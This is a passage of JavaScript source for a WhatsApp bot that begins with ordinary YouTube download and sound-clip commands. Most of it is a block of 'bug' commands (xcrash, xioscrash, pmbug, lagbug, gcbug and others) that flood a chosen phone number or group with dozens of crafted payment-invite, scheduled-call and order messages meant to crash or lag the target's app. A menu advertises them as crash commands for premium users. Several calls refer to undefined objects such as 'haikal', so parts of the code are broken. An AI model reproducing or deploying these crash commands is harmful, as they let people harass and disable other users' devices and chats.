        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await godszealplaymp3.mp3(anup3k.url)
await GODSZEALBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break
case "ytmp3": case "ytaudio":
const godszealaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !godszealaudp3.isYTUrl(text)) return replygcgodszeal(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
const audio=await godszealaudp3.mp3(text)
await GODSZEALBotInc.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
const godszealvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !godszealvidoh.isYTUrl(text)) replygcgodszeal(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await godszealvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await GODSZEALBotInc.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
GODSZEALBotInc_dev = await getBuffer(`https://github.com/DGgodszeal/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await GODSZEALBotInc.sendMessage(m.chat, { audio: GODSZEALBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break

//bug cases
case 'clearchat':
godszealimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
case 'iosq':{
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
GODSZEALBotInc.relayMessage(from,{
extendedTextMessage:{
"text":'.',
"contextInfo": {
"stanzaId": victim,
"participant": victim,
"quotedMessage": {
"conversation": godszealtext1
},
"disappearingMode": {
"initiator": "CHANGED_IN_CHAT",
"trigger": "CHAT_SETTING"
}
},
"inviteLinkGroupTypeV2": "DEFAULT"
}
},{messageId: null})
}
replygcgodszeal(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'iosgoogle': {
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
GODSZEALBotInc.sendMessage(victim,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: godszealtext6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
replygcgodszeal(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'iosgoogle2': {
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
GODSZEALBotInc.sendMessage(m.chat,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: godszealtext6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
replygcgodszeal(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break
case 'xioscrash':
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
GODSZEALBotInc.relayMessage(victim,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
replygcgodszeal(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'xioscrash2':{
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
GODSZEALBotInc.relayMessage(m.chat,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
replygcgodszeal(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break
case 'xcrash':{
if (!isPremium) return replygcgodszeal(mess.prem)
 if (!args[0]) return replygcgodszeal(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "100"
for (let i = 0; i < amount; i++) {
GODSZEALyCrashy(pushname,victim)
await sleep(3000)
}
replygcgodszeal(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'xcrash2':
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
GODSZEALyCrashy(pushname,m.chat)
await sleep(3000)
}
replygcgodszeal(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'amountbug': {
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return relygcgodszeal(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const godszealybug1 = `${godszealtext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": godszealybug1,
}
}), { userJid: from, quoted : m})
GODSZEALBotInc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcgodszeal(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'pmbug' :{
 if (!isPremium) return replygcgodszeal(mess.prem)
 if (!args[0]) return replygcgodszeal(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const godszealybug1 = `${godszealtext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": godszealybug1,
}
}), { userJid: from, quoted : m})
GODSZEALBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcgodszeal(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'delaybug' : {
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const godszealybug1 = godszealtext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": godszealybug1,
}
}), { userJid: from, quoted : m})
GODSZEALBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcgodszeal(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'docubug': {
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
if (args.length < 1) return replygcgodszeal(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const godszealybug1 = `${godszealtext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": godszealybug1,
}
}), { userJid: from, quoted : m})
GODSZEALBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcgodszeal(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'unlimitedbug' : {
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const godszealybug1 = godszealtext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": godszealybug1,
}
}), { userJid: from, quoted : m})
GODSZEALBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcgodszeal(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'bombug': {
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const godszealybug1 = godszealtext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": godszealybug1,
}
}), { userJid: from, quoted : m})
GODSZEALBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcgodszeal(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'lagbug' : {
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const godszealybug1 = godszealtext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": godszealybug1,
}
}), { userJid: from, quoted : m})
GODSZEALBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcgodszeal(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'trollybug': {
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
GODSZEALBotInc.relayMessage(victim, order.message, { messageId: order.key.id })
}
replygcgodszeal(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'gcbug' : {
if (!isPremium) return replygcgodszeal(mess.prem)
 if (!args[0]) return replygcgodszeal(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let godszealgc = await godszealBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const godszealybug1 = `${godszealtext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": godszealybug1,
}
}), { userJid: from, quoted : m})
GODSZEALBotInc.relayMessage(godszealgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcgodszeal(`*Successfully sent Bug To ${godszealgc} Please pause for 3 minutes*`)
}
break
case 'delaygcbug' :  {
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3mmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let godszealgc = await GODSZEALBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const godszealybug1 = godszealtext5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": godszealybug1,
}
}), { userJid: from, quoted : m})
GODSZEALBotInc.relayMessage(godszealgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcgodszeal(`*Successfully sent Bug To ${godszealgc} Please pause for 3 minutes*`)
}
break
case 'laggcbug' :  {
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let godszealgc = await GODSZEALBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const godszealybug1 = godszealtext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": godszealybug1,
}
}), { userJid: from, quoted : m})
GODSZEALBotInc.relayMessage(godszealgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcgodszeal(`*Successfully sent Bug To ${godszealgc} Please pause for 3 minutes*`)
}
break
case 'bomgcbug' :  {
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let godszealgc = await haikal.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const godszealybug1 = godszealtext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": godszealybug1,
}
}), { userJid: from, quoted : m})
GODSZEALBotInc.relayMessage(godszealgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcgodszeal(`*Successfully sent Bug To ${godszealgc} Please pause for 3 minutes*`)
}
break
case 'unlimitedgcbug' :  {
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let godszealgc = await GODSZEALBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const godszealybug1 = godszealtext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": godszealybug1,
}
}), { userJid: from, quoted : m})
GODSZEALBotInc.relayMessage(godszealgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcgodszeal(`*Successfully sent Bug To ${godszealgc} Please pause for 3 minutes*`)
}
break
case 'trollygcbug' :  {
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let godszealgc = await GODSZEALBotInc.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
GODSZEALBotInc.relayMessage(godszealgc, order.message, { messageId: order.key.id })
}
replygcgodszeal(`*Successfully sent Bug To ${godszealgc} Please pause for 3 minutes*`)
}
break
case 'docugcbug' :  {
if (!isPremium) return replygcgodszeal(mess.prem)
if (!args[0]) return replygcgodszeal(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let godszealgc = await GODSZEALBotInc.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const godszealybug1 = `${godszealtext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": godszealybug1,
}
}), { userJid: from, quoted : m})
GODSZEALBotInc.relayMessage(godszealgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcgodszeal(`*Successfully sent Bug To ${godszealgc} Please pause for 3 minutes*`)
} 
break
            case 'menu':
            case 'help':
            case 'alive':
            case '?':
                let godszealmenuoh = `Hello ${pushname}
╰┈➤ ${godszealytimewisher} 😄

▬▭▬▭▬▭▬▭▬▬▭▬▭▬

┏━━⟪ *𝙂𝙤𝙙'𝙨 𝙕𝙚𝙖𝙡 𝙓𝙢𝙙* ⟫━━✸
┃ ✯ Theme:- 𝙂𝙤𝙙'𝙨 𝙕𝙚𝙖𝙡 𝙓𝙢𝙙 ♛
┃ ✯ User:- ${pushname}
┃ ✯ Plugins:- 413
┃ ✯ Mem:- 27.31 GB/61.79 GB
┃ ✯ Uptime:- ${runtime(process.uptime())}
┗━━━━━━━━━━━━━━━✸
${readmore}
┌─『 ᴍᴇɴᴜ ʙᴜɢ ɴᴜᴍʙᴇʀ 』─✵  
 ❏  xᴄʀᴀꜱʜ 6286xxx  
 ❏  xɪᴏꜱᴄʀᴀꜱʜ 6286xxx 
 ❏  ɪᴏꜱɢᴏᴏɢʟᴇ 6286xxx 
 ❏  ɪᴏꜱQ 6286 
 ❏  ᴄʀᴏᴛʙᴜɢ 6286xxx 
└──────────────✸

┌──『 ᴄʀᴀꜱʜ ᴄᴏᴍᴍᴀɴᴅꜱ ──✵
 ❏ xᴄʀᴀꜱʜ2 ,5 
 ❏ xɪᴏꜱᴄʀᴀꜱʜ2 ,10 
 ❏ ɪᴏꜱɢᴏᴏɢʟᴇ2 ,20 
└──────────────✸

▬▭▬▭▬▭▬▭▬▬▭▬▭▬ 

┌──『ᴏᴡɴᴇʀ ᴍᴇɴᴜ✵ 
 ❏ ɢᴇᴛꜱᴇꜱꜱɪᴏɴ 
 ❏ ᴅᴇʟᴇᴛᴇꜱᴇꜱꜱɪᴏɴ 
 ❏ ᴊᴏɪɴ 
 ❏ ꜱʜᴜᴛᴅᴏᴡɴ  
 ❏ ʀᴇꜱᴛᴀʀᴛ 
 ❏ ᴀᴜᴛᴏʀᴇᴀᴅ [ᴏᴘᴛɪᴏɴ] 
 ❏ ᴀᴜᴛᴏᴛʏᴘɪɴɢ [ᴏᴘᴛɪᴏɴ] 
 ❏ ᴀᴜᴛᴏʀᴇᴄᴏʀᴅɪɴɢ [ᴏᴘᴛɪᴏɴ] 
 ❏ ᴀᴜᴛᴏʀᴇᴄᴏʀᴅᴛʏᴘ [ᴏᴘᴛɪᴏɴ] ,
 ❏ ᴀᴜᴛᴏʙɪᴏ [ᴏᴘᴛɪᴏɴ] 
 ❏ ᴀᴜᴛᴏꜱᴡᴠɪᴇᴡ [ᴏᴘᴛɪᴏɴ] 
 ❏ ᴍᴏᴅᴇ [ᴏᴘᴛɪᴏɴ] 
 ❏ ʙʟᴏᴄᴋ 
 ❏ ᴜɴʙʟᴏᴄᴋ  
 ❏ ʙᴀᴄᴋᴜᴘ 
 ❏ ɢᴇᴛᴄᴀꜱᴇ
 ❏ ᴀᴅᴅᴏᴡɴᴇʀ 
 ❏ ᴅᴇʟᴏᴡɴᴇʀ 
└──────────────✸

▬▭▬▭▬▭▬▭▬▬▭▬▭▬

┌──『 ɢʀᴏᴜᴘ ᴍᴇɴᴜ 』──✵
 ❏  ᴄʟᴏꜱᴇᴛɪᴍᴇ
 ❏  ᴏᴘᴇɴᴛɪᴍᴇ
 ❏  ᴋɪᴄᴋ
 ❏  ᴀᴅᴅ
 ❏  ᴘʀᴏᴍᴏᴛᴇ
 ❏  ᴅᴇᴍᴏᴛᴇ
 ❏  ꜱᴇᴛᴅᴇꜱᴄ
 ❏  ꜱᴇᴛᴘᴘɢᴄ
 ❏  ᴛᴀɢᴀʟʟ
 ❏  ɢʀᴏᴜᴘ [ᴏᴘᴛɪᴏɴ]
 ❏  ᴇᴅɪᴛɪɴꜰᴏ
 ❏  ʟɪɴᴋɢᴄ
 ❏  ʀᴇᴠᴏᴋᴇ
 ❏  ʟɪꜱᴛᴏɴʟɪɴᴇ
└──────────────✸

▬▭▬▭▬▭▬▭▬▬▭▬▭▬

┌──『 ᴍᴀɪɴ ᴍᴇɴᴜ 』──✵
 ❏ᴍᴇɴᴜ
 ❏  ʙᴜʏᴘʀᴇᴍɪᴜᴍ
 ❏  ʀᴜɴᴛɪᴍᴇ
 ❏  ꜱᴄʀɪᴘᴛ
 ❏  ᴅᴏɴᴀᴛᴇ
 ❏  ᴏᴡɴᴇʀ
└──────────────✸
▬▭▬▭▬▭▬▭▬▬▭▬▭▬

┌──『 ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ 』──✵
 ❏ sticker
 ❏ smeme
 ❏ take
 ❏ toimage
 ❏ tovideo
 ❏ toaudio
 ❏ tomp3
 ❏ tovn
 ❏ togif
 ❏ tourl
 ❏ toqr
 ❏ toviewonce
 ❏ fliptext
 ❏ emojimix
└──────────────✸
▬▭▬▭▬▭▬▭▬▬▭▬▭▬

┌──『 ᴅᴀᴛᴀʙᴀꜱᴇ ᴍᴇɴᴜ 』──✵
 ❏ ᴀᴅᴅᴠɪᴅᴇᴏ
 ❏ ᴀᴅᴅɪᴍᴀɢᴇ
 ❏ ᴀᴅᴅꜱᴛɪᴄᴋᴇʀ
 ❏ ᴀᴅᴅᴠɴ
 ❏ ᴀᴅᴅᴢɪᴘ
 ❏ ᴀᴅᴅᴀᴘᴋ
 ❏ ᴀᴅᴅᴘᴅꜰ
 ❏ ᴅᴇʟᴠɪᴅᴇᴏ
 ❏ ᴅᴇʟɪᴍᴀɢᴇ
 ❏ ᴅᴇʟꜱᴛɪᴄᴋᴇʀ
 ❏ ᴅᴇʟᴠɴ
 ❏ ᴅᴇʟᴢɪᴘ
 ❏ ᴅᴇʟᴀᴘᴋ
 ❏ ᴅᴇʟᴘᴅꜰ
 ❏ ʟɪꜱᴛᴠɪᴅᴇᴏ
 ❏ ʟɪꜱᴛɪᴍᴀɢᴇ
 ❏ ʟɪꜱᴛꜱᴛɪᴄᴋᴇʀ
 ❏ ʟɪꜱᴛᴠɴ
 ❏ ʟɪꜱᴛᴢɪᴘ
 ❏ ʟɪꜱᴛᴀᴘᴋ
 ❏ ʟɪꜱᴛᴘᴅꜰ
└──────────────✸
▬▭▬▭▬▭▬▭▬▬▭▬▭▬

┌──『 ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ 』──✵
 ❏ play
 ❏ ytmp3
 ❏ ytmp4
 ❏ sound1 - sound161
└──────────────✸
> *𝙱𝚈 𝐆𝐨𝐝'𝐬 𝐙𝐞𝐚𝐥 𝐓𝐞𝐜𝐡 †*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`
if (typemenu === 'v1') {
                    GODSZEALBotInc.sendMessage(m.chat, {
                        text: godszealmenuoh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://telegra.ph/file/aa3b4082d639bcbbf401a.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
